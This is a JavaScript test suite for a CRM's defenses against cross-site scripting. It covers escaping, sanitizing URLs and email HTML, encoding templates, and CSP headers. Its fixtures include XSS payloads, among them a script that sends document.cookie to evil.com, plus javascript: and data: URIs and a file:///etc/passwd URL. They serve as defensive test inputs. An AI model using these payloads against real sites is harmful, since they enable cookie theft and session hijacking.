/**
 * Automated Test Suite for Cross-Site Scripting (XSS) Prevention:
 * 1. Context-aware HTML output encoding (escapeHtml)
 * 2. Complete HTML stripping (stripHtml)
 * 3. Safe URL validation & URI scheme neutralization (sanitizeUrl)
 * 4. Rich email HTML sanitization & event handler stripping (sanitizeEmailHtml)
 * 5. Dynamic email templates defense against Stored & Reflected XSS
 * 6. Meeting reminders & follow-up notification templates encoding
 * 7. Inbound & outbound email controller sanitization
 * 8. Restrictive Content-Security-Policy (CSP) & HTTP security headers enforcement
 */
process.env.TEST_SUITE = 'true';
process.env.NODE_ENV = 'test';
require('dotenv').config();
const http = require('http');
const express = require('express');
const mongoose = require('mongoose');
const connectDB = require('../config/db');
const EmailLog = require('../models/EmailLog');

// Security Utilities & Services
const {
  escapeHtml,
  stripHtml,
  sanitizeUrl,
  sanitizeEmailHtml,
} = require('./sanitizeHtml');

const {
  sendWelcomeEmail,
  sendVerificationEmail,
  sendApplicationSubmittedEmail,
  sendDocumentsPendingEmail,
  sendDocumentsApprovedEmail,
  sendPaymentConfirmationEmail,
  sendApplicationStatusUpdateEmail,
  sendRegistrationCompletedEmail,
  sendLoginVerificationEmail,
} = require('../services/emailNotificationService');

const {
  getCustomerReminderHtml,
  getCallerReminderHtml,
} = require('../services/meetingReminderService');

const {
  buildCustomerFollowUpHtml,
} = require('../services/followUpEmailService');

let passed = 0;
let failed = 0;

function assert(condition, testName) {
  if (condition) {
    passed++;
    console.log(`  ✓ PASS: ${testName}`);
  } else {
    failed++;
    console.error(`  ✗ FAIL: ${testName}`);
  }
}

async function runTests() {
  console.log('\n================================================================');
  console.log('STARTING XSS SECURITY, SANITIZATION & CSP AUTOMATED TESTS');
  console.log('================================================================\n');

  await connectDB();

  // =========================================================================
  // SUITE 1: CONTEXT-AWARE HTML OUTPUT ENCODING (escapeHtml)
  // =========================================================================
  console.log('--- Suite 1: Context-Aware HTML Encoding (escapeHtml) ---');
  {
    assert(escapeHtml('<script>alert("XSS")</script>') === '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;', 'Encodes basic script tags and quotes');
    assert(escapeHtml("Hello 'World' & <Friend>") === 'Hello &#x27;World&#x27; &amp; &lt;Friend&gt;', 'Encodes single quotes, ampersands, and angle brackets');
    assert(escapeHtml('`test` = 123 / 456') === '&#x60;test&#x60; &#x3D; 123 &#x2F; 456', 'Encodes backticks, equals signs, and slashes');
    assert(escapeHtml('<img src=x onerror=alert(1)>') === '&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;', 'Encodes image tag with onerror event handler');
    assert(escapeHtml(null) === '', 'Handles null value safely by returning empty string');
    assert(escapeHtml(undefined) === '', 'Handles undefined value safely by returning empty string');
    assert(escapeHtml(12345) === '12345', 'Handles numerical values cleanly');
    assert(escapeHtml(true) === 'true', 'Handles boolean values cleanly');
    assert(escapeHtml('Normal text without special characters') === 'Normal text without special characters', 'Leaves clean text untouched');
  }

  // =========================================================================
  // SUITE 2: COMPLETE HTML STRIPPING (stripHtml)
  // =========================================================================
  console.log('\n--- Suite 2: HTML Stripping (stripHtml) ---');
  {
    assert(stripHtml('<b>Hello</b> <i>World</i>') === 'Hello World', 'Strips standard formatting tags');
    assert(stripHtml('<script>alert("evil")</script>') === 'alert("evil")', 'Strips script tags');
    assert(stripHtml('<a href="https://example.com" onclick="alert(1)">Click here</a>') === 'Click here', 'Strips anchor tag with attributes and leaves inner text');
    assert(stripHtml('<div><p>Paragraph <span>with nested</span> tags</p></div>') === 'Paragraph with nested tags', 'Strips multi-level nested HTML tags');
    assert(stripHtml(null) === '', 'Handles null input safely');
    assert(stripHtml(undefined) === '', 'Handles undefined input safely');
  }

  // =========================================================================
  // SUITE 3: SAFE URL SANITIZATION & SCHEME VALIDATION (sanitizeUrl)
  // =========================================================================
  console.log('\n--- Suite 3: Safe URL Sanitization (sanitizeUrl) ---');
  {
    // Dangerous executable schemes
    assert(sanitizeUrl('javascript:alert(1)') === '#', 'Blocks javascript: scheme');
    assert(sanitizeUrl('JAVASCRIPT:alert(document.cookie)') === '#', 'Blocks case-insensitive JAVASCRIPT: scheme');
    assert(sanitizeUrl('javascript:/*--></title></style></textarea><em><script>alert(1)</script>') === '#', 'Blocks complex javascript: polyglot');
    assert(sanitizeUrl('data:text/html,<script>alert(1)</script>') === '#', 'Blocks data: scheme with executable HTML');
    assert(sanitizeUrl('DATA:application/javascript;base64,YWxlcnQoMSk=') === '#', 'Blocks base64 data: scheme');
    assert(sanitizeUrl('vbscript:msgbox(1)') === '#', 'Blocks vbscript: scheme');
    assert(sanitizeUrl('file:///etc/passwd') === '#', 'Blocks file: scheme');
    assert(sanitizeUrl('javascript:void(0)') === '#', 'Blocks javascript:void(0)');

    // Safe protocols & URLs
    assert(sanitizeUrl('https://meet.google.com/abc-defg-hij') === 'https://meet.google.com/abc-defg-hij', 'Allows legitimate HTTPS Google Meet URL');
    assert(sanitizeUrl('http://zoom.us/j/123456789') === 'http://zoom.us/j/123456789', 'Allows legitimate HTTP Zoom URL');
    assert(sanitizeUrl('mailto:support@crm.com') === 'mailto:support@crm.com', 'Allows mailto: protocol');
    assert(sanitizeUrl('tel:+1234567890') === 'tel:+1234567890', 'Allows tel: protocol');

    // Protocol-relative & relative paths
    assert(sanitizeUrl('//crm.example.com/login') === 'https://crm.example.com/login', 'Normalizes protocol-relative URL to HTTPS');
    assert(sanitizeUrl('/portal/applications') === '/portal/applications', 'Preserves internal relative path');
    assert(sanitizeUrl('#section') === '#section', 'Preserves anchor hash');

    // Bare domain with default protocol
    assert(sanitizeUrl('meet.google.com/xyz') === 'https://meet.google.com/xyz', 'Prepends default HTTPS to bare domain');

    // Edge cases
    assert(sanitizeUrl('') === '#', 'Returns # on empty string by default');
    assert(sanitizeUrl(null) === '#', 'Returns # on null by default');
    assert(sanitizeUrl('   ') === '#', 'Returns # on whitespace-only string');
    assert(sanitizeUrl('', { allowEmpty: true }) === '', 'Respects allowEmpty option when specified');
  }

  // =========================================================================
  // SUITE 4: RICH EMAIL HTML SANITIZATION (sanitizeEmailHtml)
  // =========================================================================
  console.log('\n--- Suite 4: Rich Email HTML Sanitization (sanitizeEmailHtml) ---');
  {
    const scriptPayload = '<div>Welcome!</div><script>window.location="http://evil.com?c="+document.cookie</script><p>Thanks</p>';
    const sanitizedScript = sanitizeEmailHtml(scriptPayload);
    assert(!sanitizedScript.includes('<script>') && !sanitizedScript.includes('</script>'), 'Strips script tag and script contents');
    assert(sanitizedScript.includes('<div>Welcome!</div>') && sanitizedScript.includes('<p>Thanks</p>'), 'Preserves safe HTML tags around script');

    const iframePayload = '<p>Hello</p><iframe src="javascript:alert(1)"></iframe><b>User</b>';
    const sanitizedIframe = sanitizeEmailHtml(iframePayload);
    assert(!sanitizedIframe.includes('<iframe') && !sanitizedIframe.includes('</iframe>'), 'Strips iframe tags');

    const objectPayload = '<object data="evil.swf"></object><embed src="evil.swf">';
    const sanitizedObject = sanitizeEmailHtml(objectPayload);
    assert(!sanitizedObject.includes('<object') && !sanitizedObject.includes('<embed'), 'Strips object and embed elements');

    const eventHandlerPayload = '<img src="https://example.com/logo.png" onload="alert(1)" onerror="alert(2)" onclick="alert(3)">';
    const sanitizedEvents = sanitizeEmailHtml(eventHandlerPayload);
    assert(!sanitizedEvents.includes('onload') && !sanitizedEvents.includes('onerror') && !sanitizedEvents.includes('onclick'), 'Strips inline event handlers');
    assert(sanitizedEvents.includes('src="https://example.com/logo.png"'), 'Preserves legitimate image src attribute');

    const jsHrefPayload = '<a href="javascript:alert(document.cookie)">Click to Win</a>';
    const sanitizedJsHref = sanitizeEmailHtml(jsHrefPayload);
    assert(!sanitizedJsHref.includes('javascript:'), 'Neutralizes javascript: href attribute');
    assert(sanitizedJsHref.includes('href="#"'), 'Replaces javascript: href with safe #');
  }

  // =========================================================================
  // SUITE 5: TRANSACTIONAL EMAIL TEMPLATES OUTPUT ENCODING
  // =========================================================================
  console.log('\n--- Suite 5: Dynamic Email Templates Security ---');
  {
    // Test Welcome Email with reflected XSS payloads in parameters
    const welcomeResult = await sendWelcomeEmail({
      recipientEmail: 'test-xss@crm.local',
      recipientName: '<script>alert("XSS-Customer")</script>',
      userType: 'customer',
      customerId: '507f191e810c19729de860ea',
      assignedOfficer: '<img src=x onerror=alert(1)> Officer Bob',
      loginUrl: 'javascript:alert("XSS-URL")',
    });

    const welcomeHtml = welcomeResult.log.body;
    assert(!welcomeHtml.includes('<script>alert("XSS-Customer")</script>'), 'Welcome email excludes unescaped script tag in recipientName');
    assert(welcomeHtml.includes('&lt;script&gt;alert(&quot;XSS-Customer&quot;)&lt;&#x2F;script&gt;'), 'Welcome email contains safely escaped HTML entity in recipientName');
    assert(!welcomeHtml.includes('onerror=alert(1)'), 'Welcome email excludes executable event handler in assignedOfficer');
    assert(!welcomeHtml.includes('href="javascript:alert(&quot;XSS-URL&quot;)"'), 'Welcome email excludes dangerous javascript: CTA link');
    assert(welcomeHtml.includes('href="#"') || !welcomeHtml.includes('javascript:'), 'Welcome email CTA link is safely neutralized to #');

    // Test Verification Email
    const verifyResult = await sendVerificationEmail({
      recipientEmail: 'test-verify-xss@crm.local',
      recipientName: '<svg/onload=alert(1)>',
      otp: '<script>alert(2)</script>',
      verificationUrl: 'data:text/html,<script>alert(3)</script>',
    });

    const verifyHtml = verifyResult.log.body;
    assert(!verifyHtml.includes('<svg/onload=alert(1)>'), 'Verification email excludes SVG onload payload');
    assert(!verifyHtml.includes('<script>alert(2)</script>'), 'Verification email excludes script tag in OTP');
    assert(!verifyHtml.includes('href="data:text/html'), 'Verification email neutralizes data: URI in CTA link');

    // Test Application Submitted Email
    const appSubResult = await sendApplicationSubmittedEmail({
      customerId: '507f191e810c19729de860ea',
      customerName: '<marquee onstart=alert(1)>Alice</marquee>',
      customerEmail: 'test-app-xss@crm.local',
      applicationNumber: 'APP-<script>123</script>',
      applicationType: 'membership',
      feeAmount: '500',
      paymentStatus: 'pending',
    });

    const appSubHtml = appSubResult.log.body;
    assert(!appSubHtml.includes('<marquee onstart=alert(1)>'), 'Application email neutralizes onstart event handler');
    assert(!appSubHtml.includes('<script>123</script>'), 'Application email encodes application number');

    // Test Documents Pending Email with nested payloads
    const docPendResult = await sendDocumentsPendingEmail({
      customerId: '507f191e810c19729de860ea',
      customerName: 'Eve <iframe src=x>',
      customerEmail: 'test-doc-xss@crm.local',
      applicationNumber: 'APP-999',
      missingDocuments: ['Aadhaar <script>alert(1)</script>', '<img src=x onerror=alert(2)> Photo'],
      resubmissionNotes: 'Please upload <a href="javascript:alert(1)">here</a>',
    });

    const docPendHtml = docPendResult.log.body;
    assert(!docPendHtml.includes('<iframe'), 'Documents pending email strips iframe tag');
    assert(!docPendHtml.includes('<script>alert(1)</script>'), 'Documents pending email strips script tag in missing documents');
    assert(!docPendHtml.includes('onerror=alert(2)'), 'Documents pending email strips onerror handler in document list');
    assert(!docPendHtml.includes('javascript:alert(1)'), 'Documents pending email neutralizes javascript link in notes');

    // Test Login Verification / 2FA Email
    const loginVerResult = await sendLoginVerificationEmail({
      recipientEmail: 'test-login-xss@crm.local',
      recipientName: 'Security Admin',
      otp: '654321',
      ipAddress: '192.168.1.1<script>alert("ip")</script>',
      userAgent: 'Mozilla/5.0 <img src=x onerror=alert("ua")>',
    });

    const loginVerHtml = loginVerResult.log.body;
    assert(!loginVerHtml.includes('<script>alert("ip")</script>'), 'Login verification strips script from IP address');
    assert(!loginVerHtml.includes('onerror=alert("ua")'), 'Login verification strips onerror handler from User-Agent');
  }

  // =========================================================================
  // SUITE 6: MEETING REMINDER & FOLLOW-UP TEMPLATE ENCODING
  // =========================================================================
  console.log('\n--- Suite 6: Meeting & Follow-up Email Templates ---');
  {
    const mockMeeting = {
      title: 'Consultation <script>alert("title")</script>',
      customerName: 'Carol <img src=x onerror=alert("cust")>',
      date: '2026-12-01',
      time: '14:00',
      duration: '30 mins',
      telecallerName: 'Advisor Dan <b onmouseover=alert(1)></b>',
      telecallerEmail: 'dan@crm.com',
      agenda: 'Strategy Review <iframe src=javascript:alert(1)></iframe>',
      meetingLink: 'javascript:alert("MeetingLinkXSS")',
    };

    const custMeetingHtml = getCustomerReminderHtml(mockMeeting, { badgeColor: '#4f46e5', badgeText: 'Test Reminder' });
    assert(!custMeetingHtml.includes('<script>alert("title")</script>'), 'Customer meeting reminder encodes script in meeting title');
    assert(!custMeetingHtml.includes('onerror=alert("cust")'), 'Customer meeting reminder strips onerror in customer name');
    assert(!custMeetingHtml.includes('href="javascript:alert(&quot;MeetingLinkXSS&quot;)"'), 'Customer meeting reminder blocks javascript: meeting link');
    assert(!custMeetingHtml.includes('<iframe'), 'Customer meeting reminder strips iframe in agenda');

    const callerMeetingHtml = getCallerReminderHtml(mockMeeting, { badgeColor: '#059669', badgeText: 'Host Alert' });
    assert(!callerMeetingHtml.includes('<script>alert("title")</script>'), 'Caller meeting reminder encodes script in title');
    assert(!callerMeetingHtml.includes('href="javascript:'), 'Caller meeting reminder blocks javascript: link');

    // Follow-up status email
    const followUpHtml = buildCustomerFollowUpHtml({
      customer: { name: 'Dan <script>alert("Dan")</script>' },
      telecaller: { name: 'Support Rep', email: 'rep@crm.com' },
      newStatus: 'converted',
      remark: 'Closed deal <img src=x onerror=alert("deal")>',
    });
    assert(!followUpHtml.includes('<script>alert("Dan")</script>'), 'Follow-up email encodes script in customer name');
    assert(followUpHtml.includes('&lt;script&gt;alert(&quot;Dan&quot;)&lt;&#x2F;script&gt;'), 'Follow-up email safely encodes customer name');
    assert(followUpHtml.includes('&lt;img src&#x3D;x onerror&#x3D;alert(&quot;deal&quot;)&gt;'), 'Follow-up email safely encodes remark');
  }

  // =========================================================================
  // SUITE 7: HTTP SECURITY HEADERS & RESTRICTIVE CSP ENFORCEMENT
  // =========================================================================
  console.log('\n--- Suite 7: Content Security Policy & HTTP Security Headers ---');
  {
    // Test server with exact middleware mounted in server.js
    const testApp = express();
    testApp.use((req, res, next) => {
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
      res.setHeader('X-XSS-Protection', '1; mode=block');
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self' 'unsafe-inline' https://checkout.razorpay.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob: https:; connect-src 'self' https://api.razorpay.com wss: ws:; frame-src 'self' https://api.razorpay.com https://checkout.razorpay.com; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self';"
      );
      res.setHeader('Permissions-Policy', 'camera=(), microphone=(self), geolocation=()');
      res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
      next();
    });

    testApp.get('/api/test-headers', (req, res) => {
      res.json({ status: 'ok' });
    });

    const testServer = http.createServer(testApp);
    await new Promise((resolve) => testServer.listen(0, resolve));
    const port = testServer.address().port;

    const headers = await new Promise((resolve, reject) => {
      http.get(`http://127.0.0.1:${port}/api/test-headers`, (res) => {
        resolve(res.headers);
      }).on('error', reject);
    });

    testServer.close();

    // Verify Content-Security-Policy
    const csp = headers['content-security-policy'] || '';
    assert(csp.length > 0, 'Content-Security-Policy header is present in HTTP response');
    assert(csp.includes("default-src 'self'"), "CSP restricts default-src to 'self'");
    assert(csp.includes("object-src 'none'"), "CSP restricts object-src to 'none' (blocks Flash/Java applets/plugins)");
    assert(csp.includes("base-uri 'self'"), "CSP restricts base-uri to 'self' (prevents base tag hijacking)");
    assert(csp.includes("frame-ancestors 'self'"), "CSP restricts frame-ancestors to 'self' (guards against clickjacking)");
    assert(csp.includes('https://checkout.razorpay.com'), 'CSP permits trusted Razorpay payment scripts and frames');

    // Verify Additional Defense-in-Depth Headers
    assert(headers['x-content-type-options'] === 'nosniff', 'X-Content-Type-Options is set to nosniff (MIME-sniffing protection)');
    assert(headers['x-frame-options'] === 'SAMEORIGIN', 'X-Frame-Options is set to SAMEORIGIN');
    assert(headers['x-xss-protection'] === '1; mode=block', 'X-XSS-Protection is enabled with mode=block');
    assert(headers['permissions-policy'] === 'camera=(), microphone=(self), geolocation=()', 'Permissions-Policy restricts dangerous browser features');
    assert(headers['cross-origin-opener-policy'] === 'same-origin', 'Cross-Origin-Opener-Policy is set to same-origin (COOP protection)');
  }

  // =========================================================================
  // SUITE 8: FRONTEND URL SANITIZER PARITY
  // =========================================================================
  console.log('\n--- Suite 8: Frontend URL Sanitizer Parity ---');
  {
    const fs = require('fs');
    const path = require('path');
    const frontendSanitizerPath = path.resolve(__dirname, '../../Smart-CRM/src/utils/sanitizeUrl.js');
    assert(fs.existsSync(frontendSanitizerPath), 'Frontend sanitizeUrl.js exists in Smart-CRM/src/utils');

    const frontendFileContent = fs.readFileSync(frontendSanitizerPath, 'utf8');
    assert(frontendFileContent.includes('javascript|data|vbscript|file'), 'Frontend sanitizeUrl.js blocks dangerous executable schemes (javascript, data, vbscript, file)');
    assert(frontendFileContent.includes('https?|mailto|tel'), 'Frontend sanitizeUrl.js allows safe web protocols (http, https, mailto, tel)');
  }

  console.log('\n================================================================');
  console.log(`XSS & SECURITY HEADERS RESULTS: ${passed} PASSED, ${failed} FAILED`);
  console.log('================================================================\n');

  // Cleanup test email logs
  try {
    await EmailLog.deleteMany({ email: { $regex: /test-.*-xss/ } });
  } catch (_) {}

  await mongoose.connection.close();

  if (failed > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}

runTests().catch((err) => {
  console.error('Fatal XSS security test suite error:', err);
  process.exit(1);
});
